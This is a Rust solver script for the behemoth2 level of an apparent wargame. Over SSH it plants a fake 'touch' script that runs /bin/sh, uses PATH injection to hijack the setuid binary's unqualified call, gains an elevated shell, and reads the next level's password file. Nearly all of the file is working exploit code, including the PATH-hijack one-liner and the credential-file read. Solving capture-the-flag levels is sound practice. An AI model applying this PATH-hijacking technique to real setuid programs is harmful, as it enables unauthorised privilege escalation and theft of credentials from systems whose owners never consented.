use anyhow::Result;
use crate::util::*;

/// behemoth2 calls 'touch' unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
/// while this could be exploited by perhaps writing some command into the file (once the pid is determined), it is simpler to hijack touch via path injection
pub fn solve(password: &str) -> Result<String> {

    let session = ssh_session(super::HOST, super::PORT, "behemoth2", password)?;

    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth2@gibson:~$ ")?;

    println!("creating a writable tmp folder and moving to it");
    write_line(&mut channel, "cd $(mktemp -d) && chmod 777 $(pwd)")?;
    read_until(&mut channel, "$ ")?;

    let exploit = "echo \"/bin/sh\" > touch && chmod +x touch && PATH=. /behemoth/behemoth2";
    println!("running '{exploit}' to get a suid shell");
    write_line(&mut channel, &exploit)?;
    read_until(&mut channel, "$ ")?;

    println!("reading password");
    write_line(&mut channel, "/bin/cat /etc/behemoth_pass/behemoth3")?; // note because we murdered PATH, we need to use the qualified path to 'cat' to call it
    let result = read_until(&mut channel, "$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len()-2].trim();
    
    println!("retrieved behemoth3 pass '{result}'\n");

    Ok(result.to_string())
}